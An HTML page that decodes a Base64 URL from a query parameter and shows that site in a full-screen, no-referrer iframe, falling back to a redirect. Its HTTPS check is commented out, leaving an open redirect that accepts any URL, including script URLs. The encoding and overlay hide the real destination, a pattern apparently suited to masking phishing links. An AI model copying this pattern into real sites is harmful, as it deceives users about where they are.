<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>内容加载中...</title>
    <script>
        // Base64解码函数
        function base64Decode(str) {
            try {
                return decodeURIComponent(escape(atob(str)));
            } catch (e) {
                return null;
            }
        }

        // 获取URL参数
        function getQueryParam(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        // 初始化加载
        function init() {
            const encodedUrl = getQueryParam('c');
            if (!encodedUrl) {
                alert('链接参数错误');
                return;
            }

            const target_url = base64Decode(encodedUrl);
            if (!target_url || !target_url.startsWith('https://')) {
                // alert('无效的链接，仅支持HTTPS协议');
                // return;
            }

            // 尝试用iframe包裹显示
            try {
                var wrap = document.getElementById('tzWrap');
                var frame = document.getElementById('tzFrame');
                if (!wrap) {
                    wrap = document.createElement('div');
                    wrap.id = 'tzWrap';
                    wrap.style.cssText =
                        'position:fixed;inset:0;z-index:2147483647;background:#fff;margin:0;padding:0;border:0;';
                    frame = document.createElement('iframe');
                    frame.id = 'tzFrame';
                    frame.referrerPolicy = 'no-referrer';
                    frame.allowFullscreen = true;
                    frame.style.cssText =
                        'width:100%;height:100%;border:0;margin:0;padding:0;display:block;';
                    wrap.appendChild(frame);
                    document.body.appendChild(wrap);
                    document.body.style.overflow = 'hidden';
                }
                frame.src = target_url;
                return;
            } catch (e) {
                console.error('iframe加载失败:', e);
            }

            // 如果iframe方案失败则直接跳转
            window.location.href = target_url;
        }

        // 页面加载后执行
        window.onload = init;
    </script>
</head>
<body>
    <!-- 加载提示（可选） -->
    <div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;">
        <div style="width:40px;height:40px;border:4px solid #eee;border-top-color:#2563eb;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto;"></div>
        <p style="margin-top:15px;color:#666;font-size:14px;">加载中...</p>
    </div>
    <style>
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
